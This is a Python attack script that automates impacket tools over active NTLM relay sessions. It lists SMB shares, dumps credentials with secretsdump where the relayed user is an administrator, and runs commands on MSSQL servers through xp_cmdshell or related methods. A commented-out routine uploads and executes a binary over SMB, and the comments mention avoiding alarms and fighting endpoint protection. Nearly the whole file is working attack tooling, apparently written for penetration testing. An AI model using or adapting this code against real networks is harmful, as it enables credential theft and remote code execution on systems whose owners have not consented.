#!/usr/bin/env python3
# impacket_relay_gat.py
# author: ad0nis (Aaron Pohl)

import requests
from subprocess import run, PIPE


def main():
    # make a request for the relay info against localhost
    relay_info = get_relay_info()
    # handles each protocol ntlmrelayx supports and runs appropriate exploits in an appropriate order based off privileges.
    handle_relay_info(relay_info)


def get_relay_info():
    # Basic test to get relay info for testing:
    # curl -v http://localhost:9090/ntlmrelayx/api/v1.0/relays | python -m json.tool
    url = 'http://localhost:9090/ntlmrelayx/api/v1.0/relays'
    print("Attempting to retrieve list of active relays from '%s'." % (url))
    print("Please ensure that you have ntlmrelayx.py running with active relays showing in 'socks' command output.")
    try:
        response = requests.get(url)
        values = response.json()
        return(values)
    except Exception as error:
        print("Error:'%s' while gathering relay info from '%s'.\nCannot proceed without relay info. Are you sure you have ntlmrelayx running?" % (error, url))
        # https://stackoverflow.com/questions/19747371/python-exit-commands-why-so-many-and-when-should-each-be-used
        raise SystemExit(1)


def list_shares(relay_user, relay_host, relay_port, is_admin):
    # I would prefer to import the impacket libraries and interact directly, but I think I'm just going to subprocess/popen it...
    # echo "shares\nuse C$\nls\nexit\n" | proxychains smbclient.py -no-pass DOMAIN/USERNAME@1.2.3.4
    connection_string = relay_user + "@" + relay_host
    input = ''
    if is_admin == "TRUE":
        input = "shares\nuse C$\nls\nexit\n"
    else:
        input = "shares\nexit\n"
    print("Attempting to list SMB shares as '%s'." % (connection_string))
    try:
        proc = run(['proxychains', 'smbclient.py', '-no-pass', '-port', relay_port, connection_string ], stdout=PIPE,
            input=input, encoding='ascii')
        print(proc.stdout)
    except Exception as error:
        print("Error: '%s' listing SMB shares as '%s'." % (error, connection_string))


def smb_shell(relay_user, relay_host, relay_port):
    # I would prefer to import the impacket libraries and interact directly, but I think I'm just going to subprocess/popen it...
    connection_string = relay_user + "@" + relay_host
    input = "shares\nuse C$\nls\nmkdir CBI\ncd CBI\nput CBI.exe\nls\nexit\n"

    print("Attempting to upload CBI.exe to C:\CBI\CBI.exe as '%s'." % (connection_string))
    try:
        proc = run(['proxychains', 'smbclient.py', '-no-pass', '-port', relay_port, connection_string ], stdout=PIPE,
            input=input, encoding='ascii')
        print(proc.stdout)
    except Exception as error:
        print("Error: '%s' listing SMB shares as '%s'." % (error, connection_string))
    print("Attempting to smbexec C:\CBI\CBI.exe as '%s'." % (connection_string))
    try:
        proc2 = run(['proxychains', 'smbexec.py', '-no-pass', '-port', relay_port, connection_string ], stdout=PIPE,
            input='C:\\CBI\\CBI.exe\nexit\n', encoding='ascii')
        print(proc2.stdout)
    except Exception as error:
        print("Error: '%s' running smbexec as '%s'." % (error, connection_string))


def secretsdump(relay_user, relay_host):
    # I would prefer to import the impacket libraries and interact directly, but I think I'm just going to subprocess/popen it...
    connection_string = relay_user + "@" + relay_host
    out_user = relay_user.replace('/', '.')
    outfile = str('secretsdump.%s.%s.txt' % (out_user, relay_host))
    print("Attempting secretsdump.py as '%s'." % (connection_string))
    try:
        proc = run(['proxychains', 'secretsdump.py', '-ts', '-no-pass', '-o', outfile, connection_string ], stdout=PIPE,
            input='', encoding='ascii')
        print(proc.stdout)
    except Exception as error:
        print("Error: '%s' dumping secrets from '%s'." % (error, connection_string))


def mssql_exec(relay_user, relay_host, relay_port, method, command):
    # I would prefer to import the impacket libraries and interact directly, but I think I'm just going to subprocess/popen it...
    connection_string = relay_user + "@" + relay_host
    if method == 1:
        input = "xp_cmdshell " + command + "\n"
    elif method == 2:
        input = "sp_start_job " + command + "\n"
    elif method == 3:
        print("[!] Warning! mssql_exec method 3 automatically enables xp_cmdshell, executes a command, and then disables xp_cmdshell.")
        print("[!] If this does not happen cleanly, it could leave xp_cmdshell enabled, or if the system was relying on xp_cmdshell, it could now be disabled.")
        print('[!] This is not a recommended method, and could cause havoc.')
        input = "enable_xp_cmdshell\nxp_cmdshell " + command + "\ndisable_xp_cmdshell\n"
    try:
        proc = run(['proxychains', 'mssqlclient.py', '-windows-auth', '-no-pass', '-port', relay_port, connection_string ], stdout=PIPE,
            input=input, encoding='ascii')
        print(proc.stdout)
    except Exception as error:
        print("Error: '%s' executing command '" + command + "' as '%s'." % (error, connection_string))

"""     print("Attempting to upload CBI.exe to C:\CBI\CBI.exe as '%s'." % (connection_string))
    try:
        proc = run(['proxychains', 'smbclient.py', '-no-pass', '-port', relay_port, connection_string ], stdout=PIPE,
            input=input, encoding='ascii')
        print(proc.stdout)
    except Exception as error:
        print("Error: '%s' listing SMB shares as '%s'." % (error, connection_string))
    print("Attempting to smbexec C:\CBI\CBI.exe as '%s'." % (connection_string))
    try:
        proc2 = run(['proxychains', 'smbexec.py', '-no-pass', '-port', relay_port, connection_string ], stdout=PIPE,
            input='C:\\CBI\\CBI.exe\nexit\n', encoding='ascii')
        print(proc2.stdout)
    except Exception as error:
        print("Error: '%s' running smbexec as '%s'." % (error, connection_string)) """


def list_databases(relay_user, relay_host, relay_port):
    # I would prefer to import the impacket libraries and interact directly, but I think I'm just going to subprocess/popen it...
    # BAD EXAMPLE WILL UPDATE LATER >:D : echo "shares\nuse C$\nls\nexit\n" | proxychains smbclient.py -no-pass DOMAIN/USERNAME@1.2.3.4
    connection_string = relay_user + "@" + relay_host
    input = 'SELECT name FROM master.sys.databases;\n'
    print("Attempting to list MSSQL databases as '%s'." % (connection_string))
    try:
        proc = run(['proxychains', 'mssqlclient.py', '-windows-auth', '-no-pass', '-port', relay_port, connection_string ], stdout=PIPE,
            input=input, encoding='ascii')
        print(proc.stdout)
    except Exception as error:
        print("Error: '%s' listing MSSQL databases as '%s'." % (error, connection_string))


def handle_relay_info(relay_info):
    # example SMB: ["SMB", "1.2.3.4", "domain/user", "TRUE", "445"]
    # example MSSQL: ["MSSQL", "1.2.3.4", "DOMAIN/user", "N/A", "60183"]
    for relay in relay_info:
        # Break it up into usable bits...
        protocol = relay[0]
        relay_host = relay[1]
        relay_user = relay[2]
        is_admin = relay[3]
        relay_port = relay[4]

        if protocol == 'SMB' and is_admin == 'TRUE':
            # SMB and Local admin
            # list_shares first, as this is unlikely to trip any alarms.
            # Take a shot at a shell second, as this may raise alarms, but is less likely to break the relay than secretsdump is IMO
            # and especially against Cylance, which I was fighting while writing this. ;)
            list_shares(relay_user, relay_host, relay_port, is_admin)
            #smb_shell(relay_user, relay_host, relay_port)
            secretsdump(relay_user, relay_host)
        if protocol == 'SMB' and is_admin == 'FALSE':
            list_shares(relay_user, relay_host, relay_port, is_admin)
        if protocol == 'MSSQL':
            list_databases(relay_user, relay_host, relay_port)
            method = 1      # Methods are 1,2,3 in order of safest to dirtiest.
            command = 'calc.exe'
            mssql_exec(relay_user, relay_host, relay_port, method, command)
        if protocol == 'IMAP':
            # TODO: do some magic. I've never played with this one, and will need some time with it.
            # dump_emails()
            print("IMAP is not implemented yet. Sorry. Good luck with that one.")
        if protocol == 'HTTP':
            # TODO: do some magic. Have only played with this with petitpotam, and even then without much success.
            # petitpotam()
            print("HTTP is not implemented yet. Sorry. Good luck with that one.")


if __name__ == '__main__':
    main()
